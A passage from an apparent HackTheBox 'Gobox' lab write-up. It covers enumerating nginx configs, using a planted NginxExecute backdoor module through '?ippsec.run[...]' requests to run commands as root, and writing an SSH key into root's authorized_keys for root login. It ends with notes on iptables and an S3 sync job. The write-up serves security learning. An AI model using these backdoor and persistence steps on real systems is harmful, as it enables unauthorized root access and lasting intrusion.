</span></span><span class="line"><span class="cl">tcp        <span class="m">0</span>      <span class="m">0</span> 0.0.0.0:22              0.0.0.0:*               LISTEN      -
</span></span><span class="line"><span class="cl">tcp        <span class="m">0</span>      <span class="m">0</span> 127.0.0.1:8000          0.0.0.0:*               LISTEN      -
</span></span><span class="line"><span class="cl">tcp6       <span class="m">0</span>      <span class="m">0</span> :::9000                 :::*                    LISTEN      -
</span></span><span class="line"><span class="cl">tcp6       <span class="m">0</span>      <span class="m">0</span> :::9001                 :::*                    LISTEN      -
</span></span><span class="line"><span class="cl">tcp6       <span class="m">0</span>      <span class="m">0</span> :::22                   :::*                    LISTEN
</span></span></code></pre></div><p>I immediately inspected the NGINX configuration file under <code>/etc/nginx/sites-enabled/</code>. There is only one file there called <code>default</code> and it contains the following configurations:</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-nginx" data-lang="nginx"><span class="line"><span class="cl"><span class="c1"># LocalStack that simulates AWS S3
</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="k">server</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="kn">listen</span> <span class="mi">4566</span> <span class="s">default_server</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">        <span class="kn">root</span> <span class="s">/var/www/html</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">        <span class="kn">index</span> <span class="s">index.html</span> <span class="s">index.htm</span> <span class="s">index.nginx-debian.html</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">        <span class="kn">server_name</span> <span class="s">_</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">        <span class="kn">location</span> <span class="s">/</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">                <span class="kn">if</span> <span class="s">(</span><span class="nv">$http_authorization</span> <span class="s">!~</span> <span class="s">&#34;(.*)SXBwc2VjIFdhcyBIZXJlIC0tIFVsdGltYXRlIEhhY2tpbmcgQ2hhbXBpb25zaGlwIC0gSGFja1RoZUJveCAtIEhhY2tpbmdFc3BvcnRz(.*)&#34;)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">                    <span class="kn">return</span> <span class="mi">403</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">                <span class="p">}</span>
</span></span><span class="line"><span class="cl">                <span class="kn">proxy_pass</span> <span class="s">http://127.0.0.1:9000</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">        <span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c1"># Homepage
</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="k">server</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="kn">listen</span> <span class="mi">80</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">        <span class="kn">root</span> <span class="s">/opt/website</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">        <span class="kn">index</span> <span class="s">index.php</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">        <span class="kn">location</span> <span class="p">~</span> <span class="sr">[^/]\.php(/|$)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">            <span class="kn">fastcgi_index</span> <span class="s">index.php</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">            <span class="kn">fastcgi_param</span> <span class="s">REQUEST_METHOD</span> <span class="nv">$request_method</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">            <span class="kn">fastcgi_param</span> <span class="s">SCRIPT_FILENAME</span> <span class="nv">$document_root$fastcgi_script_name</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">            <span class="kn">fastcgi_param</span> <span class="s">QUERY_STRING</span> <span class="nv">$query_string</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">            <span class="kn">fastcgi_pass</span> <span class="s">unix:/tmp/php-fpm.sock</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">        <span class="p">}</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c1"># Login page
</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="k">server</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="kn">listen</span> <span class="mi">8080</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">        <span class="kn">add_header</span> <span class="s">X-Forwarded-Server</span> <span class="s">golang</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">        <span class="kn">location</span> <span class="s">/</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">                <span class="kn">proxy_pass</span> <span class="s">http://127.0.0.1:9001</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">        <span class="p">}</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c1"># unknown
</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="k">server</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="kn">listen</span> <span class="n">127.0.0.1</span><span class="p">:</span><span class="mi">8000</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">        <span class="kn">location</span> <span class="s">/</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">                <span class="kn">command</span> <span class="no">on</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">        <span class="p">}</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span></code></pre></div><p>Based on the configuration above and the <code>docker-compose.yml</code> file I found under <code>/opt/website/</code>, the server that listens on port 4566 is routed into the internal port 9000 which is mapped into the LocalStack container (host:4566 [with auth]-&gt;host:9000-&gt;container-localstack:4566).</p>
<p>To confirm that, I run another scan against port 4566, and <code>nmap</code> shows that it&rsquo;s open, but it&rsquo;s forbidden because there is authorization check.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">→ kali@kali «gobox» «10.10.14.97»
</span></span><span class="line"><span class="cl">$ nmap -sV -sC -p4566 10.10.11.113
</span></span><span class="line"><span class="cl">Starting Nmap 7.91 <span class="o">(</span> https://nmap.org <span class="o">)</span> at 2021-09-08 06:51 EDT
</span></span><span class="line"><span class="cl">Nmap scan report <span class="k">for</span> gobox.htb <span class="o">(</span>10.10.11.113<span class="o">)</span>
</span></span><span class="line"><span class="cl">Host is up <span class="o">(</span>0.047s latency<span class="o">)</span>.
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">PORT     STATE SERVICE VERSION
</span></span><span class="line"><span class="cl">4566/tcp open  http    nginx
</span></span><span class="line"><span class="cl"><span class="p">|</span>_http-title: <span class="m">403</span> Forbidden
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
</span></span><span class="line"><span class="cl">Nmap <span class="k">done</span>: <span class="m">1</span> IP address <span class="o">(</span><span class="m">1</span> host up<span class="o">)</span> scanned in 13.35 seconds
</span></span></code></pre></div><p>Since I know the correct authorization value, I can add it to the authorization header and get access to port 4566.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">→ kali@kali «gobox» «10.10.14.97»
</span></span><span class="line"><span class="cl">$ curl -sv http://10.10.11.113:4566/ -H <span class="s1">&#39;Authorization: Basic SXBwc2VjIFdhcyBIZXJlIC0tIFVsdGltYXRlIEhhY2tpbmcgQ2hhbXBpb25zaGlwIC0gSGFja1RoZUJveCAtIEhhY2tpbmdFc3BvcnRz&#39;</span>
</span></span><span class="line"><span class="cl">*   Trying 10.10.11.113:4566...
</span></span><span class="line"><span class="cl">* Connected to 10.10.11.113 <span class="o">(</span>10.10.11.113<span class="o">)</span> port <span class="m">4566</span> <span class="o">(</span><span class="c1">#0)</span>
</span></span><span class="line"><span class="cl">&gt; GET / HTTP/1.1
</span></span><span class="line"><span class="cl">&gt; Host: 10.10.11.113:4566
</span></span><span class="line"><span class="cl">&gt; User-Agent: curl/7.74.0
</span></span><span class="line"><span class="cl">&gt; Accept: */*
</span></span><span class="line"><span class="cl">&gt; Authorization: Basic SXBwc2VjIFdhcyBIZXJlIC0tIFVsdGltYXRlIEhhY2tpbmcgQ2hhbXBpb25zaGlwIC0gSGFja1RoZUJveCAtIEhhY2tpbmdFc3BvcnRz
</span></span><span class="line"><span class="cl">&gt;
</span></span><span class="line"><span class="cl">* Mark bundle as not supporting multiuse
</span></span><span class="line"><span class="cl">&lt; HTTP/1.1 <span class="m">404</span>
</span></span><span class="line"><span class="cl">&lt; Server: nginx
</span></span><span class="line"><span class="cl">&lt; Date: Thu, <span class="m">09</span> Sep <span class="m">2021</span> 07:33:54 GMT
</span></span><span class="line"><span class="cl">&lt; Content-Type: text/html<span class="p">;</span> <span class="nv">charset</span><span class="o">=</span>utf-8
</span></span><span class="line"><span class="cl">&lt; Content-Length: <span class="m">21</span>
</span></span><span class="line"><span class="cl">&lt; Connection: keep-alive
</span></span><span class="line"><span class="cl">&lt; access-control-allow-origin: *
</span></span><span class="line"><span class="cl">&lt; access-control-allow-methods: HEAD,GET,PUT,POST,DELETE,OPTIONS,PATCH
</span></span><span class="line"><span class="cl">&lt; access-control-allow-headers: authorization,content-type,content-length,content-md5,cache-control,x-amz-content-sha256,x-amz-date,x-amz-security-token,x-amz-user-agent,x-amz-target,x-amz-acl,x-amz-version-id,x-localstack-target,x-amz-tagging,amz-sdk-invocation-id,amz-sdk-request
</span></span><span class="line"><span class="cl">&lt; access-control-expose-headers: x-amz-version-id
</span></span><span class="line"><span class="cl">&lt;
</span></span><span class="line"><span class="cl">* Connection <span class="c1">#0 to host 10.10.11.113 left intact</span>
</span></span><span class="line"><span class="cl"><span class="o">{</span><span class="s2">&#34;status&#34;</span>: <span class="s2">&#34;running&#34;</span><span class="o">}</span>
</span></span></code></pre></div><p>As for port 80 and 8080, it&rsquo;s clear that they are the homepage and the login page site.</p>
<p>The next one is request routing for port 8000, this is my first time to see &ldquo;command on&rdquo; written on NGINX&rsquo;s config file.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-nginx" data-lang="nginx"><span class="line"><span class="cl"><span class="k">server</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="kn">listen</span> <span class="n">127.0.0.1</span><span class="p">:</span><span class="mi">8000</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">        <span class="kn">location</span> <span class="s">/</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">                <span class="kn">command</span> <span class="no">on</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">        <span class="p">}</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span></code></pre></div><p>When I try to interact with it, it returns nothing.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">www-data@gobox:/opt$ curl -s http://127.0.0.1:8000
</span></span><span class="line"><span class="cl">www-data@gobox:/opt$ curl -I http://127.0.0.1:8000
</span></span><span class="line"><span class="cl">curl: <span class="o">(</span>52<span class="o">)</span> Empty reply from server
</span></span></code></pre></div><p>With <code>nc</code>, it returns a &ldquo;Bad Request&rdquo;.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">www-data@gobox:/$ nc -vn 127.0.0.1 <span class="m">8000</span>
</span></span><span class="line"><span class="cl">Connection to 127.0.0.1 <span class="m">8000</span> port <span class="o">[</span>tcp/*<span class="o">]</span> succeeded!
</span></span><span class="line"><span class="cl">/
</span></span><span class="line"><span class="cl">HTTP/1.1 <span class="m">400</span> Bad Request
</span></span><span class="line"><span class="cl">Server: nginx
</span></span><span class="line"><span class="cl">Date: Wed, <span class="m">08</span> Sep <span class="m">2021</span> 11:13:48 GMT
</span></span><span class="line"><span class="cl">Content-Type: text/html
</span></span><span class="line"><span class="cl">Content-Length: <span class="m">150</span>
</span></span><span class="line"><span class="cl">Connection: close
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">&lt;html&gt;
</span></span><span class="line"><span class="cl">&lt;head&gt;&lt;title&gt;400 Bad Request&lt;/title&gt;&lt;/head&gt;
</span></span><span class="line"><span class="cl">&lt;body&gt;
</span></span><span class="line"><span class="cl">&lt;center&gt;&lt;h1&gt;400 Bad Request&lt;/h1&gt;&lt;/center&gt;
</span></span><span class="line"><span class="cl">&lt;hr&gt;&lt;center&gt;nginx&lt;/center&gt;
</span></span><span class="line"><span class="cl">&lt;/body&gt;
</span></span><span class="line"><span class="cl">&lt;/html&gt;
</span></span></code></pre></div><p>If I look at the date modified of the NGINX folder, there are 6 folders that were modified on August 26 at the same time.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">www-data@gobox:/etc/nginx$ ls -lt
</span></span><span class="line"><span class="cl">total <span class="m">64</span>
</span></span><span class="line"><span class="cl">drwxr-xr-x <span class="m">2</span> root root <span class="m">4096</span> Aug <span class="m">26</span> 21:26 snippets
</span></span><span class="line"><span class="cl">drwxr-xr-x <span class="m">2</span> root root <span class="m">4096</span> Aug <span class="m">26</span> 21:26 sites-available
</span></span><span class="line"><span class="cl">drwxr-xr-x <span class="m">2</span> root root <span class="m">4096</span> Aug <span class="m">26</span> 21:26 sites-enabled
</span></span><span class="line"><span class="cl">drwxr-xr-x <span class="m">2</span> root root <span class="m">4096</span> Aug <span class="m">26</span> 21:26 modules-enabled
</span></span><span class="line"><span class="cl">drwxr-xr-x <span class="m">2</span> root root <span class="m">4096</span> Aug <span class="m">26</span> 21:26 conf.d
</span></span><span class="line"><span class="cl">drwxr-xr-x <span class="m">2</span> root root <span class="m">4096</span> Aug <span class="m">26</span> 21:26 modules-available
</span></span><span class="line"><span class="cl">-rw-r--r-- <span class="m">1</span> root root <span class="m">1484</span> Aug <span class="m">24</span> 20:30 nginx.conf
</span></span><span class="line"><span class="cl">-rw-r--r-- <span class="m">1</span> root root <span class="m">3071</span> Feb  <span class="m">4</span>  <span class="m">2019</span> win-utf
</span></span><span class="line"><span class="cl">-rw-r--r-- <span class="m">1</span> root root <span class="m">1077</span> Feb  <span class="m">4</span>  <span class="m">2019</span> fastcgi.conf
</span></span><span class="line"><span class="cl">-rw-r--r-- <span class="m">1</span> root root <span class="m">1007</span> Feb  <span class="m">4</span>  <span class="m">2019</span> fastcgi_params
</span></span><span class="line"><span class="cl">-rw-r--r-- <span class="m">1</span> root root <span class="m">2837</span> Feb  <span class="m">4</span>  <span class="m">2019</span> koi-utf
</span></span><span class="line"><span class="cl">-rw-r--r-- <span class="m">1</span> root root <span class="m">2223</span> Feb  <span class="m">4</span>  <span class="m">2019</span> koi-win
</span></span><span class="line"><span class="cl">-rw-r--r-- <span class="m">1</span> root root <span class="m">3957</span> Feb  <span class="m">4</span>  <span class="m">2019</span> mime.types
</span></span><span class="line"><span class="cl">-rw-r--r-- <span class="m">1</span> root root  <span class="m">180</span> Feb  <span class="m">4</span>  <span class="m">2019</span> proxy_params
</span></span><span class="line"><span class="cl">-rw-r--r-- <span class="m">1</span> root root  <span class="m">636</span> Feb  <span class="m">4</span>  <span class="m">2019</span> scgi_params
</span></span><span class="line"><span class="cl">-rw-r--r-- <span class="m">1</span> root root  <span class="m">664</span> Feb  <span class="m">4</span>  <span class="m">2019</span> uwsgi_params
</span></span></code></pre></div><p>When I visit the <code>modules-enabled</code> folder, I find a module with a suspicious name &ldquo;backdoor&rdquo;!</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">www-data@gobox:/etc/nginx$ ls -l modules-enabled
</span></span><span class="line"><span class="cl">total <span class="m">12</span>
</span></span><span class="line"><span class="cl">-rw-r--r-- <span class="m">1</span> root root <span class="m">48</span> Aug <span class="m">23</span> 20:50 50-backdoor.conf
</span></span><span class="line"><span class="cl">lrwxrwxrwx <span class="m">1</span> root root <span class="m">61</span> Aug <span class="m">23</span> 14:43 50-mod-http-image-filter.conf -&gt; /usr/share/nginx/modules-available/mod-http-image-filter.conf
</span></span><span class="line"><span class="cl">lrwxrwxrwx <span class="m">1</span> root root <span class="m">60</span> Aug <span class="m">23</span> 14:43 50-mod-http-xslt-filter.conf -&gt; /usr/share/nginx/modules-available/mod-http-xslt-filter.conf
</span></span><span class="line"><span class="cl">lrwxrwxrwx <span class="m">1</span> root root <span class="m">48</span> Aug <span class="m">23</span> 14:43 50-mod-mail.conf -&gt; /usr/share/nginx/modules-available/mod-mail.conf
</span></span><span class="line"><span class="cl">lrwxrwxrwx <span class="m">1</span> root root <span class="m">50</span> Aug <span class="m">23</span> 14:43 50-mod-stream.conf -&gt; /usr/share/nginx/modules-available/mod-stream.conf
</span></span></code></pre></div><p>The module loads a <code>.so</code> file called <code>ngx_http_execute_module.so</code>. I found that file under <code>/usr/lib/nginx/modules/</code>.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">www-data@gobox:/etc/nginx$ cat modules-enabled/50-backdoor.conf
</span></span><span class="line"><span class="cl">load_module modules/ngx_http_execute_module.so
</span></span><span class="line"><span class="cl">www-data@gobox:/etc/nginx$ find / -type f -name <span class="s2">&#34;ngx_http_execute_module.so&#34;</span> 2&gt;/dev/null
</span></span><span class="line"><span class="cl">/usr/lib/nginx/modules/ngx_http_execute_module.so
</span></span><span class="line"><span class="cl">www-data@gobox:/etc/nginx$ file /usr/lib/nginx/modules/ngx_http_execute_module.so
</span></span><span class="line"><span class="cl">/usr/lib/nginx/modules/ngx_http_execute_module.so: ELF 64-bit LSB shared object, x86-64, version <span class="m">1</span> <span class="o">(</span>SYSV<span class="o">)</span>, dynamically linked, BuildID<span class="o">[</span>sha1<span class="o">]=</span>4279ae42bf642b21378aa43c06b52f4d0b89f2ad, with debug_info, not stripped
</span></span></code></pre></div><p>I&rsquo;m trying to find the origin of this module by grabbing some readable code using  <code>strings</code>. It turns out the backdoor is taken from this Github repository: <a href="https://github.com/limithit/NginxExecute">NginxExecute</a>.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">→ kali@kali «loot» «10.10.14.97»
</span></span><span class="line"><span class="cl">$ strings ngx_http_execute_module.so <span class="p">|</span> grep <span class="s1">&#39;.c$&#39;</span>
</span></span><span class="line"><span class="cl">ngx_pcalloc
</span></span><span class="line"><span class="cl">__ctype_b_loc
</span></span><span class="line"><span class="cl">realloc
</span></span><span class="line"><span class="cl">malloc
</span></span><span class="line"><span class="cl">ngxexecute_strncpy_alloc
</span></span><span class="line"><span class="cl">ngxexecute_strcpy_alloc
</span></span><span class="line"><span class="cl">~iHc
</span></span><span class="line"><span class="cl">/home/ubuntu/NginxExecute//ngx_result.c
</span></span><span class="line"><span class="cl">7src
</span></span><span class="line"><span class="cl">...<span class="o">[</span>SNIP<span class="o">]</span>...
</span></span></code></pre></div><h4 id="nginx-backdoor">NGINX Backdoor</h4>
<p>According to the README file from the repository, I just need to send a HTTP request with <code>?system.run[command]</code>, but it doesn&rsquo;t work here.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">www-data@gobox:/etc/nginx$ curl -v <span class="s2">&#34;http://127.0.0.1:8000/?system.run[whoami]&#34;</span>
</span></span><span class="line"><span class="cl">* Trying 127.0.0.1:8000...
</span></span><span class="line"><span class="cl">* TCP_NODELAY <span class="nb">set</span>
</span></span><span class="line"><span class="cl">* Connected to 127.0.0.1 <span class="o">(</span>127.0.0.1<span class="o">)</span> port <span class="m">8000</span> <span class="o">(</span><span class="c1">#0)</span>
</span></span><span class="line"><span class="cl">&gt; GET /?system.run<span class="o">[</span>ifconfig<span class="o">]</span> HTTP/1.1
</span></span><span class="line"><span class="cl">&gt; Host: 127.0.0.1:8000
</span></span><span class="line"><span class="cl">&gt; User-Agent: curl/7.68.0
</span></span><span class="line"><span class="cl">&gt; Accept: */*
</span></span><span class="line"><span class="cl">&gt;
</span></span><span class="line"><span class="cl">* Empty reply from server
</span></span><span class="line"><span class="cl">* Connection <span class="c1">#0 to host 127.0.0.1 left intact</span>
</span></span><span class="line"><span class="cl">curl: <span class="o">(</span>52<span class="o">)</span> Empty reply from server
</span></span></code></pre></div><p>Running another <code>strings</code> command against the backdoor reveals it uses <code>ippsec.run</code>.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">→ kali@kali «loot» «10.10.14.97»
</span></span><span class="line"><span class="cl">$ strings ngx_http_execute_module.so <span class="p">|</span> grep <span class="s1">&#39;run&#39;</span>
</span></span><span class="line"><span class="cl">ippsec.run
</span></span></code></pre></div><p>Now if I send <code>?ippsec.run[whoami]</code>, it returns:</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">www-data@gobox:/etc/nginx$ curl -g <span class="s2">&#34;http://127.0.0.1:8000/?ippsec.run[whoami]&#34;</span>
</span></span><span class="line"><span class="cl">root
</span></span></code></pre></div><p>Using the previous reverse shell script I dropped on <code>/tmp/</code>, I can get an interactive shell access as root, but then the shell gets exited by itself.</p>
<p><div class="img-container"><img src="imgs/image-20210908184311943.png" alt="image-20210908184311943"  /></div>
</p>
<p>So instead, I will inject my SSH public key.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">www-data@gobox:/etc/nginx$ <span class="nb">echo</span> <span class="s1">&#39;ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAINEBYhHk8/REIEriu8mkvQf4nihDP/deVl1j3Do/9R1H&#39;</span> &gt; /tmp/iamf
</span></span><span class="line"><span class="cl">www-data@gobox:/etc/nginx$ curl -g <span class="s2">&#34;http://127.0.0.1:8000/?ippsec.run[cat /tmp/iamf | tee /root/.ssh/authorized_keys]&#34;</span>
</span></span><span class="line"><span class="cl">ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAINEBYhHk8/REIEriu8mkvQf4nihDP/deVl1j3Do/9R1H
</span></span></code></pre></div><p>Now I can SSH login as root.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">→ kali@kali «gobox» «10.10.14.97»
</span></span><span class="line"><span class="cl">$ ssh root@10.10.11.113
</span></span><span class="line"><span class="cl">Welcome to Ubuntu 20.04.3 LTS <span class="o">(</span>GNU/Linux 5.4.0-81-generic x86_64<span class="o">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"> * Documentation:  https://help.ubuntu.com
</span></span><span class="line"><span class="cl"> * Management:     https://landscape.canonical.com
</span></span><span class="line"><span class="cl"> * Support:        https://ubuntu.com/advantage
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">  System information as of Wed <span class="m">08</span> Sep <span class="m">2021</span> 11:52:18 AM UTC
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">  System load:                      0.0
</span></span><span class="line"><span class="cl">  Usage of /:                       37.1% of 9.72GB
</span></span><span class="line"><span class="cl">  Memory usage:                     20%
</span></span><span class="line"><span class="cl">  Swap usage:                       0%
</span></span><span class="line"><span class="cl">  Processes:                        <span class="m">244</span>
</span></span><span class="line"><span class="cl">  Users logged in:                  <span class="m">0</span>
</span></span><span class="line"><span class="cl">  IPv4 address <span class="k">for</span> br-bb21b8b9b286: 172.28.0.1
</span></span><span class="line"><span class="cl">  IPv4 address <span class="k">for</span> docker0:         172.17.0.1
</span></span><span class="line"><span class="cl">  IPv4 address <span class="k">for</span> ens160:          10.10.11.113
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="m">0</span> updates can be applied immediately.
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">The list of available updates is more than a week old.
</span></span><span class="line"><span class="cl">To check <span class="k">for</span> new updates run: sudo apt update
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">Last login: Thu Aug <span class="m">26</span> 23:56:12 <span class="m">2021</span>
</span></span><span class="line"><span class="cl">root@gobox:~#
</span></span></code></pre></div><p>I can grab the root flag as well.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">root@gobox:~# ls -l
</span></span><span class="line"><span class="cl">total <span class="m">12</span>
</span></span><span class="line"><span class="cl">-rwxr-xr-x <span class="m">1</span> root root  <span class="m">536</span> Aug <span class="m">24</span> 20:33 iptables.sh
</span></span><span class="line"><span class="cl">-rw------- <span class="m">1</span> root root   <span class="m">33</span> Aug <span class="m">26</span> 21:10 root.txt
</span></span><span class="line"><span class="cl">drwxr-xr-x <span class="m">3</span> root root <span class="m">4096</span> Aug <span class="m">26</span> 21:26 snap
</span></span><span class="line"><span class="cl">root@gobox:~# cat root.txt
</span></span><span class="line"><span class="cl">81d35...<span class="o">[</span>SNIP<span class="o">]</span>...
</span></span></code></pre></div><h2 id="explore">Explore</h2>
<h3 id="undetected-ports">Undetected ports</h3>
<p>During enumeration, when I printed the networking status, I noticed that ports 9000, 9001, and 4566 should be accessible from external, with the exception that port 4566 needs an authentication header set first to be accessible.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">www-data@gobox:/opt$ netstat -tlpn
</span></span><span class="line"><span class="cl"><span class="o">(</span>Not all processes could be identified, non-owned process info
</span></span><span class="line"><span class="cl"> will not be shown, you would have to be root to see it all.<span class="o">)</span>
</span></span><span class="line"><span class="cl">Active Internet connections <span class="o">(</span>only servers<span class="o">)</span>
</span></span><span class="line"><span class="cl">Proto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name
</span></span><span class="line"><span class="cl">tcp        <span class="m">0</span>      <span class="m">0</span> 0.0.0.0:9000            0.0.0.0:*               LISTEN      -
</span></span><span class="line"><span class="cl">tcp        <span class="m">0</span>      <span class="m">0</span> 0.0.0.0:9001            0.0.0.0:*               LISTEN      -
</span></span><span class="line"><span class="cl">tcp        <span class="m">0</span>      <span class="m">0</span> 0.0.0.0:8080            0.0.0.0:*               LISTEN      -
</span></span><span class="line"><span class="cl">tcp        <span class="m">0</span>      <span class="m">0</span> 0.0.0.0:80              0.0.0.0:*               LISTEN      -
</span></span><span class="line"><span class="cl">tcp        <span class="m">0</span>      <span class="m">0</span> 127.0.0.53:53           0.0.0.0:*               LISTEN      -
</span></span><span class="line"><span class="cl">tcp        <span class="m">0</span>      <span class="m">0</span> 0.0.0.0:4566            0.0.0.0:*               LISTEN      -
</span></span><span class="line"><span class="cl">tcp        <span class="m">0</span>      <span class="m">0</span> 0.0.0.0:22              0.0.0.0:*               LISTEN      -
</span></span><span class="line"><span class="cl">tcp        <span class="m">0</span>      <span class="m">0</span> 127.0.0.1:8000          0.0.0.0:*               LISTEN      -
</span></span><span class="line"><span class="cl">tcp6       <span class="m">0</span>      <span class="m">0</span> :::9000                 :::*                    LISTEN      -
</span></span><span class="line"><span class="cl">tcp6       <span class="m">0</span>      <span class="m">0</span> :::9001                 :::*                    LISTEN      -
</span></span><span class="line"><span class="cl">tcp6       <span class="m">0</span>      <span class="m">0</span> :::22                   :::*                    LISTEN
</span></span></code></pre></div><p>It turns out there is a set of <code>iptables</code> rules which drop any connection coming to these ports.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">root@gobox:~# iptables -L
</span></span><span class="line"><span class="cl">Chain INPUT <span class="o">(</span>policy ACCEPT<span class="o">)</span>
</span></span><span class="line"><span class="cl">target     prot opt <span class="nb">source</span>               destination         
</span></span><span class="line"><span class="cl">ACCEPT     all  --  localhost/8          anywhere            
</span></span><span class="line"><span class="cl">ACCEPT     all  --  172.16.0.0/12        anywhere            
</span></span><span class="line"><span class="cl">DROP       tcp  --  anywhere             anywhere             tcp dpt:9002
</span></span><span class="line"><span class="cl">DROP       tcp  --  anywhere             anywhere             tcp dpt:9001
</span></span><span class="line"><span class="cl">DROP       tcp  --  anywhere             anywhere             tcp dpt:9000
</span></span><span class="line"><span class="cl">...<span class="o">[</span>SNIP<span class="o">]</span>...
</span></span></code></pre></div><p><em>Shouldn&rsquo;t it then return with <code>filtered</code> status?</em></p>
<p>Well, I think it was purely my mistake. I used <code>--min-rate=10000</code>, so this could be the reason <code>nmap</code> misidentified the filtered port as closed.</p>
<h3 id="gobox-request-routing">Gobox Request Routing</h3>
<p>The first time I looked into the NGINX configuration file, it didn&rsquo;t make sense to me why my web shell is on the host OS? In fact, I uploaded my web shell to an S3 bucket, which is also a container.</p>
<p>Now, with root access obtained, I could understand what was happening, and there was a synchronization process between the host and the LocalStack container.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">root@gobox:~# cat /var/spool/incron/root 
</span></span><span class="line"><span class="cl">/opt/deploy/.localstack/data/recorded_api_calls.json    IN_MODIFY       /usr/bin/aws --endpoint-url http://127.0.0.1:9000 s3 sync s3://website /opt/website
</span></span><span class="line"><span class="cl">/home/ubuntu/user.txt   IN_MODIFY       cp /home/ubuntu/user.txt /var/www/
</span></span></code></pre></div><p>So if I upload something into the bucket, the host will have it as well.</p>
